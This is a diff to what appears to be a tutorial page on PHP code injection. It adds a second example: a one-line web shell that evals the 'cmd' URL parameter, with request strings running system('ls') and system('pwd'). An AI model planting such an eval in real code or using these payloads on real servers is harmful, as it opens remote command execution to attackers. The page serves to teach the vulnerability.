@@ -6,6 +6,8 @@ Due to its characteristics of dynamic interaction with user's input, it can be v
 
 Below is the one of example that can be exploited. It is a simple code that receive user input and evaluate the input as PHP code.
 
+### _Example 1. When PHP source code is vulnerable_
+
 ```php
 <?php
 $input=$_GET['search'];
@@ -22,3 +24,18 @@ eval($input);
 ```
 
 This simple URL parameter could simply lead to entry point for attackers.&#x20;
+
+
+
+### _Example 2. PHP code to obtain Web Shell_
+
+```php
+<?php
+eval($_GET["cmd"]);
+?>
+```
+
+```php
+?cmd=system("ls"); 
+?cmd=system("pwd");
+```
